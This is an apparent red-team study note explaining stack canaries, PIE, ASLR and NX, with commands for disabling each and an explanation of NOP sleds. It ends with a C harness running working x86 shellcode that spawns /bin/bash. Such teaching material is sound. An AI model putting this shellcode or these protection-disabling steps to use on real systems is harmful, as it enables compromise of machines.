
> [!abstract] Exploit Mitigations & Shellcoding (Stack, PIE, ASLR, NX)
> Modern compilers and operating systems deploy several layers of defense to prevent memory corruption exploits. Red teamers and exploit developers must understand these mitigations—Stack Canaries, Position Independent Executables (PIE), Address Space Layout Randomization (ASLR), and the No-Execute (NX) bit—and know how to disable or bypass them during testing.
> **MITRE ATT&CK Mapping:** [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)

---

## 1. Stack Canaries (`-fstack-protector`)

> [!info] StackGuard Mechanism
> StackGuard works by inserting a small, random value known as a **canary** between the stack variables (buffers) and the function return address. When a stack-buffer overflows into the function return address, the canary is overwritten first. During function return, the canary value is checked. If the value has changed, the program is immediately terminated (`__stack_chk_fail`).
> 
> **Compiler Flag:** `gcc -fstack-protector` (Enable) / `gcc -fno-stack-protector` (Disable)

> [!example]+ Stack Frame Layout with Canary
> ```mermaid
> flowchart TD
>     subgraph StackFrame ["function1() Stack Frame"]
>         direction TB
>         Top["Top of Stack (Low Memory)"]
>         B2["buffer2[10]"]
>         B1["buffer1[15]"]
>         FP["Stack Frame Pointer (Saved EBP)"]
>         Can["🛡️ StackGuard Canary"]
>         RA["Return Address"]
>         ArgC["arg: c (3)"]
>         ArgB["arg: b (2)"]
>         ArgA["arg: a (1)"]
>         Bot["Bottom of Stack (High Memory)"]
>     end
>     Top --> B2
>     B2 --> B1
>     B1 --> FP
>     FP --> Can
>     Can --> RA
>     RA --> ArgC
>     ArgC --> ArgB
>     ArgB --> ArgA
>     ArgA --> Bot
> 
>     style Can fill:#ffcccc,stroke:#cc0000,stroke-width:3px
>     style RA fill:#ccddff,stroke:#01579b,stroke-width:2px
> ```
> *To exploit a buffer overflow when a canary is present, an attacker must either leak the canary value or brute-force it, placing the correct value in the payload before overwriting the Return Address.*

## 2. Position Independent Code (PIE) & ASLR

> [!tip] PIE (`-fpie`)
> The idea behind PIC/PIE is simple: add an additional level of indirection to all global data and function references in the code. By cleverly utilizing artifacts of the linking and loading processes, it's possible to make the text section of the binary truly position independent. It can be mapped into different memory addresses without needing to change one bit.
> 
> **Compiler Flag:** `gcc -fpie` (Enable) / `gcc -fno-pie` (Disable)

> [!bug]+ Memory Layout with PIE
> ```mermaid
> flowchart TD
>     subgraph Memory ["Memory Layout (PIE Enabled)"]
>         direction TB
>         CodeBase["Code Section Base: 0xXXXX0000"]
>         Offset["Function Offset: 0xEF80"]
>         CodeBase --> Offset
>         Offset --> DataBase["Data Section Base: 0xXXXXF000"]
>     end
>     Note1["Truly position independent.<br>Mapped into different addresses without needing to change one bit."]
>     Offset --> Note1
> 
>     style CodeBase fill:#ccddff,stroke:#01579b
>     style DataBase fill:#ccffcc,stroke:#1b5e20
>     style Offset fill:#fff3e0,stroke:#e65100
> ```

> [!danger] Address Space Layout Randomization (ASLR)
> ASLR randomizes the base addresses where the executable and shared libraries are loaded. Even if PIE is enabled, ASLR must be active at the OS level to randomize the PIE base.
> 
> **Linux ASLR:**
> ```bash
> # Check ASLR status (0=Disabled, 1=Partial, 2=Full)
> cat /proc/sys/kernel/randomize_va_space
> 
> # Disable ASLR temporarily
> sudo sysctl -w kernel.randomize_va_space=0
> # Enable Full ASLR
> sudo sysctl -w kernel.randomize_va_space=2
> 
> # Better: Disable ASLR for a single binary execution (No root needed)
> setarch x86_64 -R ./vuln 
> ```
> 
> **Windows ASLR (DEP/NX):**
> ```cmd
> :: Compile without ASLR (No PIE equivalent)
> cl vuln.c /link /DYNAMICBASE:NO 
> 
> :: Patch an existing binary to remove ASLR
> editbin /DYNAMICBASE:NO vuln.exe 
> ```

---

## 3. NX Bit & Executable Stack (`-z execstack`)

> [!warning] The No-Execute (NX) Bit
> The NX bit marks certain memory regions (like the stack and heap) as non-executable. If an attacker successfully injects shellcode into a buffer on the stack and redirects execution there, the CPU will throw a segmentation fault instead of executing the code.
> 
> **Compiler Flag:** `gcc -z execstack` (Disable NX / Make stack executable) / `gcc -z noexecstack` (Enable NX)
> 
> **Post-Compilation Patching (**`execstack` **tool):**
> You don't need to recompile the binary to change this flag. You can use the `execstack` tool.
> ```bash
> # Clear the executable stack flag (Enable NX)
> execstack -c bin.elf
> checksec bin.elf
> 
> # Set the executable stack flag (Disable NX)
> execstack -s bin.elf
> checksec bin.elf
> ```

---

## 4. Shellcoding & NOP Sleds

> [!info] What is Shellcode?
> A shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell (`/bin/sh` or `cmd.exe`) from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.

> [!success+] NOP Sled Technique
> When ASLR is disabled and the stack is executable (NX disabled), attackers use a NOP sled to handle slight variations in stack addresses. A NOP (`\x90`) instruction does nothing and simply moves to the next instruction. By placing a large block of NOPs before the shellcode, the attacker only needs to guess an address that lands *somewhere* inside the NOP sled. Execution will slide right into the shellcode.

> [!example+] NOP Sled Stack Layout
> ```mermaid
> flowchart TD
>     subgraph ExploitStack ["Stack Layout (Buffer Overflow Payload)"]
>         direction TB
>         Top["Top of Stack (Low Memory)"]
>         NOP["300 * NOP (\x90\x90\x90...)"]
>         Shellcode["Shellcode (/bin/bash)"]
>         Buf["char str[128] (AAA...)"]
>         SavedEBP["Saved EBP (AAAA)"]
>         RetAddr["Return Address (0xbfffefcc+200)"]
>         Bot["Bottom of Stack (High Memory)"]
>     end
>     Top --> NOP
>     NOP --> Shellcode
>     Shellcode --> Buf
>     Buf --> SavedEBP
>     SavedEBP --> RetAddr
>     RetAddr --> Bot
> 
>     style NOP fill:#ccffcc,stroke:#1b5e20,stroke-width:2px
>     style Shellcode fill:#ffcccc,stroke:#cc0000,stroke-width:2px
>     style RetAddr fill:#ccddff,stroke:#01579b,stroke-width:2px
> ```

> [!bug]+ C Code: Shellcode Execution Test
> This C code executes raw shellcode in memory. The shellcode provided spawns `/bin/bash` via `execve` syscall.
> ```c
> #include <stdio.h>
> #include <string.h>
> 
> char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
> "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
> "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
> "\x51\x53\x89\xe1\xcd\x80";
> 
> int main(int argc, char *argv[]) {
>     fprintf(stdout, "Length: %d\n", strlen(shellcode));
>     
>     // Cast the char array to a function pointer and execute it
>     typedef void (*func)();
>     func f = (func) &shellcode;
>     f();
>     
>     return 0;
> }
> ```
> *Resource: [7feilee/shellcode GitHub Repo](https://github.com/7feilee/shellcode/tree/master)*
